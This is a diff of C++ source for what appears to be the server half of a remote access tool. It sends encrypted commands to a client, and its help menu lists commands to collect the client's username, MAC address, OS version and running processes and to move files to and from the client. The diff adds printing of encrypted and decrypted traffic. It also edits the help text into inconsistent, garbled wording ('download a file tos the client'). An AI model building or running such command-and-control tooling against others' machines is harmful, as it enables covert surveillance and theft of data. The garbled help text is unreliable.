@@ -204,7 +204,7 @@ void func(SOCKET connfd)
         string encryptedBuff = encrypt(string(buff));
         strncpy(buff, encryptedBuff.c_str(), encryptedBuff.size());
         buff[encryptedBuff.size()] = '\0';
-        // printf("\nencrypted buffer: %s", buff);
+        printf("\nencrypted command:\n %s\n", buff);
 
         // and send that buffer to client
         send(connfd, buff, sizeof(buff), 0);
@@ -217,9 +217,11 @@ void func(SOCKET connfd)
 
         // read the message from client and copy it in buffer
         recv(connfd, buff, sizeof(buff), 0);
+        printf("\nencrypted data received from client:\n%s\n", buff);
         string decryptedBuff = decrypt(string(buff));
         strncpy(buff, decryptedBuff.c_str(), decryptedBuff.size());
         buff[decryptedBuff.size()] = '\0';
+        printf("\ndecrypted data received from client:\n%s\n\n", buff);
 
         if (strstr(before, "UPLOAD")) {
             char* token = strtok(before, " ");
@@ -239,7 +241,7 @@ void func(SOCKET connfd)
         }
 
         // print buffer which contains the client contents
-        cout << "Client's response:\n" << buff << endl;
+        //cout << "Client's response:\n" << buff << endl;
         bzero(buff, MAX);
     }
 }
@@ -326,7 +328,7 @@ int main()
         "USERNAME : this will gather the client's username\n\tMACADDRESS : this will gather the client's " 
         "MAC Address\n\tOS VERSION : this will gather the client's Operating System\n\tRUNNING PROCESSES : this will "
         "list out the client's running processes\n\tUPLOAD <upload_from_path> <upload_to_path> : this will upload"
-        " a file to the client\n\tDOWNLOAD <download_from_path> <download_to_path> : this will download a file from "
+        " a file to the server\n\tDOWNLOAD <download_from_path> <download_to_path> : this will download a file tos "
         "the client\n\tEXIT: close the server socket\n\n" << endl;
 
     func(ClientSocket);
